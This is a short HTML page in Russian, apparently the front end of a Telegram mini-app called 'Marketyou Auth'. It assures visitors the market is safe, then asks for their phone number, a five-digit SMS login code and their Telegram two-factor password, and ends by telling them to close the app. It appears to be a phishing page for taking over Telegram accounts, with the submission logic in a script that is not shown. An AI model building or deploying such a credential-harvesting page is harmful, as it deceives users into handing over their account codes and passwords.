<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Marketyou Auth</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <header>
            <h1>😉 Наш маркет - безопасен! Войдите для продолжения.</h1>
            <button id="loginBtn" class="login-btn">Войти</button>
        </header>

        <div id="authForm" class="auth-form hidden">
            <div id="statusMsg" class="status-msg"></div>
            <div id="loadingSpinner" class="loading hidden"></div>
            <input type="tel" id="phoneInput" class="input-field hidden" placeholder="+7 (XXX) XXX-XX-XX" readonly>
            <input type="text" id="codeInput" class="input-field hidden" placeholder="Введите SMS-код" maxlength="5">
            <input type="password" id="2faInput" class="input-field hidden" placeholder="Пароль 2FA (оставьте пустым, если нет)">
            <button id="submitBtn" class="submit-btn hidden">Отправить</button>
            <div id="successMsg" class="success hidden">✅ Авторизация успешна! Закройте приложение.</div>
            <div id="errorMsg" class="error hidden"></div>
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>
